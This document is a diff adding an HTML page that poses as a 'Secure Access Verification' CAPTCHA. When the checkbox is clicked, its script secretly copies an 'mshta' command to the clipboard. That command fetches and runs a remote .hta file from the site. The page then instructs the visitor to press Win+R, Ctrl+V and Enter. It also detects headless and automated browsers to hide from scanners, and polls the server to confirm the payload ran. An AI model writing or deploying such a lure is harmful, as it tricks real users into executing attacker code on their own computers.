@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Secure Access Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 16px;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background: #f2f2f2;
+      font-family: Roboto, Helvetica, Arial, sans-serif;
+      text-align: center;
+      color: #202124;
+    }
+    header { margin-bottom: 12px; max-width: 460px;}
+    header h1 {
+      font-size: 24px;
+      margin: 0;
+      color: #1a73e8;
+    }
+    header p {
+      font-size: 14px;
+      margin: 4px 0 16px;
+    }
+    .checkbox-window {
+      width: 300px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      position: relative;    
+      cursor: pointer;
+      margin-bottom: 12px;
+      padding: 12px;
+      min-height: 90px;      
+    }
+    .checkbox-container {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+    }
+    .checkbox {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #c1c1c1;
+      border-radius: 4px;
+      background: #fff;
+      transition: border .3s, background .3s;
+    }
+    .checkbox:hover { border-color: #b2b2b2; }
+    .checkbox.checked {
+      border-color: #1a73e8;
+      background: #fff url('data:image/svg+xml;utf8,<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="%231a73e8" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg"><polyline points="20 6 9 17 4 12"/></svg>') center/18px no-repeat;
+    }
+    .im-not-a-robot {
+      position: absolute;
+      top: 50%;
+      left: 52px;
+      transform: translateY(-50%);
+      font-size: 15px;
+      font-weight: 500;
+    }
+    .captcha-logo {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      width: 48px;
+      height: 48px;
+      transform: translateY(-50%);
+    }
+    .checkbox-desc {
+      position: absolute;
+      bottom: 0px;
+      left: 0;
+      width: 100%;
+      font-size: 12px;
+      line-height: 1.3;
+      text-align: center;
+      color: #70757a;
+    }
+
+    .checkbox-desc a {
+      color: #70757a;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .checkbox-desc a:hover {
+      text-decoration: underline;
+    }
+    .spinner {
+      position: absolute;
+      top: 27px;
+      left: 12px;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(0,0,0,.1);
+      border-top: 2px solid #333;
+      border-radius: 50%;
+      opacity: 0;
+    }
+    .spinner.visible {
+      animation: spin 1s linear infinite;
+      opacity: 1;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .verify-window {
+      width: 320px;
+      background: #fff;
+      border: 1px solid #cecece;
+      border-radius: 4px;
+      box-shadow: 0 2px 6px rgba(60,64,67,.15);
+      display: none;
+      flex-direction: column;
+      margin-top: 12px;
+      opacity: 0;
+      transition: opacity .2s;
+      z-index: 200;
+    }
+    .verify-window.visible {
+      display: flex;
+      opacity: 1;
+    }
+    .verify-header {
+      background: #1a73e8;
+      color: #fff;
+      padding: 16px;
+      font-size: 16px;
+    }
+    .verify-header-big {
+      display: block;
+      font-size: 24px;
+      font-weight: 700;
+      margin-top: 4px;
+    }
+    .verify-main {
+      padding: 16px;
+      font-size: 13px;
+      color: #111;
+    }
+    .verify-main > div {
+      margin-bottom: 8px;
+    }
+    .verify-main ol {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .verify-main ol li {
+      margin: 4px 0;
+    }
+    .verify-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid #cecece;
+      padding: 12px 16px;
+    }
+    .verify-text { font-size: 14px; color: #5f6368; }
+    .verify-success { color: #34a853; }
+    .verify-btn {
+      background: #1a73e8;
+      color: #fff;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 16px;
+      font-size: 14px;
+      cursor: not-allowed;
+      opacity: .6;
+      text-transform: uppercase;
+    }
+    .verify-btn.enabled {
+      cursor: pointer;
+      opacity: 1;
+    }
+    footer {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Secure Access Verification</h1>
+    <p>
+      To help protect our service from automated bots, please complete the quick verification below.
+      Once verified, you’ll be automatically redirected. <br>It only takes a moment.
+    </p>
+
+  </header>
+
+  <div id="checkbox-window" class="checkbox-window">
+    <div class="checkbox-container">
+      <div id="checkbox" class="checkbox"></div>
+    </div>
+    <span class="im-not-a-robot">I’m not a robot</span>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAIGElEQVRo3t2ZC1AU9x3HPeEOOB6KhOCUTnicIAeCUGxQOA64O+S4QxAxaUwjNpiaDirYWgKVIdqgghDACsgzgHBvIIpvzUyaaZxJk+YxZmzajM40sbF1akwmNiS148z299/977G3t7v34NCZ7sx3uJ27/e/n83/tf/8sWvR/eoggfhCxj+KPg8pcjMtfuEOxZUvQlo6bZ5/tnSXI9FDZgvNMN5Wf0Dk2l6dxnvodlUztyIP0Dca7azYY38sqmxgseHr8+V/stayqqKgNwkILIiMJiIxMKG68+mbF0VliE50uKuU4GzuplNHpmEspToq6h0gpHCXkhUYiSWOFTEKmiNSiydmsjZb252pH5bh1RL7uQsGS8PBUbeMHf/BUoJQpoEECfUSyZoyQMwRWqqftydBPvrn5hZF0X7eIXaJ433tvs+HdEdjwKggU9gB4PyFXDxPJaqOTQKIKRz1FZJZYRquqmpa5kBDV149K3BVFPwoRL12aoT9w4wZX7bsSSAaBZDUlIFdBK6jNnAIJqikyco3tK93WoSdxazjx6PUvSFPWW6y427l1iH968J2XUBcq97D/ky2gQQJ9AP4aBAmME0kg4VD7DIEVBVPQGtOEsny8kgUp0um2S1M0ppOxykkCzqXuwPtXtv/1QLmrrsNT+3MC/XMCGiRggFg54enI8qcIRdl4DT3AdboqaUqh6RSCxwKhruD9nmv9uIYP3p3aJ7uQmiGgYQoYiZUqK6cAgqejKBvempNTFppcaJqJy6PgsUCYEPzi7a+8peLr867guQWGSYEk9QQloDKBgAkEbLwC8QCMzmHcfITg3RUQVe3uiNrYee8eG9qp23QKw5c4CZygBFRGDG8CcBQrr0A8BmfCx+baBAXEFS2fTbqE7xDuOrRAiuYowPfNCagMpECig4AZwK0+ERA9u29mbRlXTXsBjwJl5gYsidBEy3K2ydKquxOUA3cSHQTMVApMAG9zgvdUQFJ25NY7noLrDn85q9730TU2PBZ4HM8YEZAYyJqYlK2NMtVr3zHhE/LNZGT5VuHaFxAQbfyleTUbki80fNHL165H/nClVhwUlqWqu/I2E76kfZa+kQivQtGUGAz5wZLH4zWy7OOfJqrMdvgVeVRk+TbB2ucT8C9t/kuvu+Ao2t9cux4UEZUF14ajAiXB4amql959i4ZnCLCf7khkaVBYxJNx2d2fMAVk8Dc+zwSx2uHdEkhSKEL1bV//RwjYAb7t7nfRstUFuKDF9rUTSOTX/fH3AgL2qRp9Fx6ZqIhTnJil4SkBFItdgt19uARExbuHM0oFgNkDNbPiUCNctwyDOC4AQ8JXIQm9sAD5sExISItemTf4IRs+DkVJSbDhYxTOAn7afVdedAJ+9VsyG9odU3To8zsBAQEyngUVlli2Kr/hg0toMcj3vCkv/3loWtHYDA0vy7fgmqfgUWLJvzaXApKipk9GacCStntUjnzDmeyfjXThmUUktBQPXLo8FpXN9f2mTTsA/sQpIXjUCrFKKxlSAsNzCQRpD978EMHpj3xN6FvvUmn5koyOleS8qmL8rutqKS7mkLTDryhwho/nhIfkonN+geD1r9z+SgfQusP/IooP/YPQoRy8xZmoxLQ4Vt93+yWpvNwZHs39bPi4PBZ8rhXA6TgLhOpb/vlAd/g2Bdn8OaH97Q1Ce+A6oX35UzJFjMDvH+PZfRB8JczJeSYobf3w6YT8cZgyUSYgBkKmhOQaiPjcCZBAMQA0OocoJog4hYFMbA6VGAh7OR12+fJlwpNcunTJKUaj8d2SkhKhFw00Hp6AZEDQ82OtF0HXrUbd3kHgwoULhLc5f/48MTAwcDUkJETOM2iZ40KCbz6fBLJbOsxbcJTe3t4/S6XSDBcz04IeYZ4AM4Phf4ThFy96REcYF5yrAPw1sVj8yOG9EhgbG7sJ8Jk+gBdVV1dL59v1PBY4efLk/dLS0gye/Ru34RsbG2NmZmbuNDc3y+dTEV51ocnJyVuVlZXLvaw90Y4dOx6bnp7+4uzZswRIfAsyKd5KeCWAMjU1dWvnzl8letgSfk1NTbLp6ddJeDpIoqGhIdUbCY8Ezp075xC48/2enp6G9PR0qcDTmPyfg1qtDh4YGNqLrmHCz1cijA3lTU7NzHwzMjbW3dXVpdyzZ0+UXC6XoKDP3d3dytHR0aOnT5++xwXOlqirq1vliYRPBJhBLXXx4kUy6NwVNI+E22PC5wLeQDNz5swZGF+nUHdKdmeScBKAef42Kuhhg9PwdGCm+zeMmyUeCaDlgb+/f25NTc3gw4Jmg6PAeCFqa2vb3dlKtwv09/d/DE/YDPzCHr9//37TQkILwdfX15/Am2FilwKokMHBwasAn85YHqBlq2zv3l/3+hLWHfidO3d3owrkWjpzHSFDQ0PvA/xq1pJYhAuI2bR5czX0x+8XEhzFYrF8X1RcvAvXfKC7T/kAOOLxFoiI5yUkKjo6WnXs2LH30Y0WotY7Ojr+BPdQw72W43u6vUTh20FwePxD0Gwg12q126G7feaNCBd4X1/f35RK5YuobHwP/4VadtPjIhKSmp2dva21tfUNs9n8X0/BbTbb/ZaWljcyM3+8DZWFd7EDH9Z7hR9+N0W7E2ght1aRl/c8THnHOzs7r4yMjPzdYDDMQn9+gDIxMTE7PDz8RVtb25Vdu3YdX7duXRV+QU/EZQTNc1k+rxaR4C3zCLzjkARBM9kavIOQhT+n4++ewL8Nxtc+0jc5tow/hgrk2UmQ4N/4DPp/N0P1KyiVEy8AAAAASUVORK5CYII=" class="captcha-logo" alt="captcha logo" />
+    <p class="checkbox-desc">
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy</a> •
+      <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+    </p>
+    <div id="spinner" class="spinner"></div>
+  </div>
+
+  <div id="verify-window" class="verify-window">
+    <div class="verify-header">Complete these <span class="verify-header-big">Verification Steps</span></div>
+    <div class="verify-main">
+      <div>On your keyboard, press the following key combinations:</div>
+      <ol>
+        <li><i class="fab fa-windows"></i> + <kbd>R</kbd></li>
+        <li><kbd>Ctrl</kbd> + <kbd>V</kbd></li>
+        <li><kbd>Enter</kbd></li>
+      </ol>
+    </div>
+    <div class="verify-footer">
+      <span id="verify-text" class="verify-text">Perform the steps above to finish verification.</span>
+      <button id="verify-btn" class="verify-btn" disabled>Verify</button>
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2025 SecureCorp Pty Ltd. All rights reserved.
+  </footer>
+
+  <script>
+    if (window.top !== window.self) window.top.location = window.self.location;
+    if (navigator.webdriver || /Headless/.test(navigator.userAgent)) {
+      document.body.innerHTML = '<p>Access denied.</p>';
+      throw new Error('Automation detected');
+    }
+
+    const box = document.getElementById('checkbox-window');
+    const chk = document.getElementById('checkbox');
+    const spin = document.getElementById('spinner');
+    const pop = document.getElementById('verify-window');
+    const vbtn = document.getElementById('verify-btn');
+    const vtxt = document.getElementById('verify-text');
+
+    let vid, pollID;
+
+    function enableVerify() {
+      clearInterval(pollID);
+      vbtn.disabled = false;
+      vbtn.classList.add('enabled');
+      vtxt.textContent = 'Verification complete';
+      vtxt.classList.add('verify-success');
+    }
+
+    async function poll() {
+      try {
+        const res = await fetch(`/verify.php?vid=${encodeURIComponent(vid)}`);
+        if (res.status === 200) enableVerify();
+      } catch {}
+    }
+
+    function showPopup() {
+      pop.classList.add('visible');
+      pollID = setInterval(poll, 2000);
+    }
+
+    box.addEventListener('click', () => {
+      if (chk.classList.contains('checked')) return;
+      vid = Math.random().toString(36).slice(-6);
+      chk.classList.add('checked');
+      spin.classList.add('visible');
+      navigator.clipboard.writeText('mshta ' + location.origin + '/vrfy.hta?vid=' + vid);
+
+      let moved = false;
+      window.addEventListener('mousemove', () => moved = true, { once: true });
+
+      setTimeout(() => {
+        spin.classList.remove('visible');
+        if (moved) showPopup();
+        else window.addEventListener('mousemove', showPopup, { once: true });
+      }, 1000);
+    });
+
+    vbtn.addEventListener('click', () => location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+  </script>
+</body>
+</html>
